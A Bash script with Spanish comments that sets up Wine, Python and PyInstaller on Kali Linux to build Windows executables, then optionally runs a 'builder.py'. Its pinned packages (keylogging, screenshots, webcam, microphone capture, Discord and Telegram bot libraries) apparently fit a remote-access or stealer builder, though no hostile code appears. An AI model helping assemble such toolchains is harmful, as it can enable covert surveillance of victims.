#!/usr/bin/env bash
# -----------------------------------------------------------------
# Script para configurar un entorno de desarrollo basado en Wine,
# Python y herramientas adicionales en Kali Linux.
#
# NOTA: Este script omite pasos redundantes que ya se realizan en
# 'install_wine.sh' (configuración de WineHQ, repositorios, etc.).
#
# Ejemplo de uso no interactivo:
#   export AUTO_SETUP=1
#   sudo ./setup_development.sh
#
# -----------------------------------------------------------------

# --- Configuración Global ---
set -euo pipefail
trap 'handle_error $? $LINENO' ERR  # Captura errores

# Variables configurables
# Si se quiere actualizar automáticamente a la última versión de Python,
# se puede habilitar esta función. Si no, se usará el valor por defecto.
: "${PYTHON_WINE_VERSION:=3.10.4}"
if command -v curl &>/dev/null; then
    # Actualiza la versión de Python con la última versión encontrada en python.org
    PYTHON_WINE_VERSION=$(curl -s https://www.python.org/ftp/python/ \
        | grep -oP '(?<=/)[0-9]+\.[0-9]+\.[0-9]+' | sort -V | tail -n 1)
fi

WINE_PATHS=("$HOME/.wine" "/root/.wine")
LOG_FILE="setup.log"
DEPENDENCIES=( 
    pip==25.0.1 pyinstaller==5.6.0 pillow==9.5.0 pyscreeze==0.1.28 
    pyautogui==0.9.52 psutil==5.9.0 keyboard==0.13.5 pywin32==305 
    pycryptodome==3.18.0 discord_webhook==0.14.0 discord.py==2.0.0 
    opencv-python==4.7.0.72 sounddevice==0.4.4 scipy==1.10.0 
    pyTelegramBotAPI==4.7.0 PyGithub==1.56
)

# --- Funciones Auxiliares ---

# Manejo de errores
handle_error() {
    local exit_code=$1
    local line_number=$2
    print_msg "Error en la línea $line_number. Código de salida: $exit_code" "error"
    exit "$exit_code"
}

# Imprimir mensajes formateados (colores y prefijos)
print_msg() {
    local color_code prefix msg_type msg
    msg_type="${2:-info}"
    msg="$1"
    case "$msg_type" in
        "success") color_code="\033[1;32m"; prefix="[+] " ;;
        "error")   color_code="\033[1;31m"; prefix="[!] " ;;
        "info")    color_code="\033[1;34m"; prefix="[*] " ;;
        "query")   color_code="\033[1;35m"; prefix="[?] " ;;
        *)         color_code="\033[0m";     prefix="" ;;
    esac
    echo -e "\n${color_code}${prefix}${msg}\033[0m" | tee -a "$LOG_FILE"
}

# Verificar comandos esenciales
check_essentials() {
    local essentials=("wget" "dpkg" "apt" "wine" "curl")
    for cmd in "${essentials[@]}"; do
        if ! command -v "$cmd" &>/dev/null; then
            print_msg "Comando crítico no encontrado: $cmd" "error"
            exit 1
        fi
    done
}

# Detectar distribución (enfocado a Debian/Kali, pero extensible)
detect_distribution() {
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        echo "$ID"
    else
        echo "unknown"
    fi
}

# Verificar privilegios: si no es root, reejecutar con sudo
check_privileges() {
    if [[ $EUID -ne 0 ]]; then
        print_msg "No se está ejecutando como root. Intentando reejecutar con sudo..." "info"
        exec sudo "$0" "$@"
    fi
}

# --- Funciones de Instalación y Configuración ---

# Instalar dependencias del sistema (agrupadas en una única llamada)
install_system_deps() {
    print_msg "Instalando dependencias del sistema..." "info"
    
    # Agrupamos paquetes para mayor eficiencia
    local packages=(python3 python3-pip git wget curl winetricks)
    apt update -y && apt install -y --no-install-recommends "${packages[@]}"
}

# Instalar Visual Studio Build Tools en Wine
install_vs_build_tools() {
    local installer="vs_buildtools.exe"
    print_msg "Instalando Visual Studio Build Tools..." "info"
    
    if ! wget -qO "$installer" "https://aka.ms/vs/17/release/vs_buildtools.exe"; then
        print_msg "No se pudo descargar $installer" "error"
        return 1
    fi

    wine "$installer" --quiet --wait --norestart --nocache \
        --installPath "C:\\BuildTools" \
        --add Microsoft.VisualStudio.Workload.VCTools | tee -a "$LOG_FILE"
    rm -f "$installer"
}

# Configurar Python dentro de Wine
setup_wine_python() {
    local installer="python-${PYTHON_WINE_VERSION}.exe"
    print_msg "Instalando Python $PYTHON_WINE_VERSION en Wine..." "info"
    
    if ! wget -q "https://www.python.org/ftp/python/${PYTHON_WINE_VERSION}/${installer}"; then
        print_msg "No se pudo descargar $installer" "error"
        return 1
    fi

    wine "$installer" /quiet InstallAllUsers=0 PrependPath=1 | tee -a "$LOG_FILE"
    rm -f "$installer"
}

# Instalar dependencias de Python en el entorno Wine
install_wine_deps() {
    local python_exe
    python_exe=$(find_python_in_wine) || { 
        print_msg "No se encontró Python en Wine" "error"; 
        return 1; 
    }

    print_msg "Instalando dependencias en Wine..." "info"
    wine "$python_exe" -m pip install --upgrade "${DEPENDENCIES[@]}" | tee -a "$LOG_FILE"
}

# Buscar archivos en las rutas de Wine (se usa variable local 'found')
find_in_wine() {
    local pattern="$1" wine_path found
    for wine_path in "${WINE_PATHS[@]}"; do
        found=$(find "$wine_path" -path "$pattern" -print -quit 2>/dev/null)
        if [[ -n "$found" ]]; then
            echo "$found"
            return 0
        fi
    done
    return 1
}

find_python_in_wine() {
    find_in_wine "*/drive_c/*/Python*/python.exe"
}

find_pyinstaller_in_wine() {
    find_in_wine "*/drive_c/*/Scripts/pyinstaller.exe"
}

# Configurar entorno virtual local (en Linux)
setup_virtualenv() {
    print_msg "Configurando entorno virtual..." "info"
    
    if [[ -d ".venv" ]]; then
        print_msg "El entorno virtual ya existe. Activándolo..." "info"
    else
        if ! python3 -m venv .venv; then
            print_msg "Error al crear el entorno virtual" "error"
            return 1
        fi
    fi

    source .venv/bin/activate
    if [[ -f "requirements.txt" ]]; then
        pip install -r requirements.txt | tee -a "$LOG_FILE"
    else
        print_msg "Archivo requirements.txt no encontrado" "error"
        return 1
    fi
}

# --- Ejecución Principal ---
main() {
    # Redirigir toda la salida al log
    exec > >(tee -a "$LOG_FILE") 2>&1

    check_essentials
    check_privileges "$@"

    local distro
    distro=$(detect_distribution)
    print_msg "Distribución detectada: $distro" "info"

    # Se omiten pasos de configuración de WineHQ ya realizados en 'install_wine.sh'
    install_system_deps

    # Verificar si Visual Studio Build Tools están instalados en Wine
    if ! wine "C:\\BuildTools\\Common7\\Tools\\VsDevCmd.bat" -? &>/dev/null; then
        install_vs_build_tools || exit 1
    fi

    # Configurar Python en Wine si no se encuentra instalado
    if ! find_python_in_wine >/dev/null; then
        setup_wine_python || exit 1
    fi

    install_wine_deps || exit 1

    local PYINSTALLER_PATH
    PYINSTALLER_PATH=$(find_pyinstaller_in_wine)
    if [[ -z "$PYINSTALLER_PATH" ]]; then
        print_msg "PyInstaller no encontrado en Wine." "error"
        exit 1
    fi
    export PYINSTALLER_PATH

    # Preguntar si se debe crear un entorno virtual local (valor predeterminado: No)
    print_msg "¿Crear entorno virtual? (s/N):" "query"
    read -r -n 1 response
    response=${response:-N}
    echo  # Salto de línea
    if [[ "$response" =~ [sS] ]]; then
        setup_virtualenv || exit 1
    fi

    # Preguntar si se debe ejecutar builder.py (valor predeterminado: No)
    print_msg "¿Ejecutar builder.py? (s/N):" "query"
    read -r -n 1 response
    response=${response:-N}
    echo  # Salto de línea
    if [[ "$response" =~ [sS] ]]; then
        python3 builder.py "$PYINSTALLER_PATH"
    fi

    print_msg "Configuración completada exitosamente" "success"
}

main "$@"
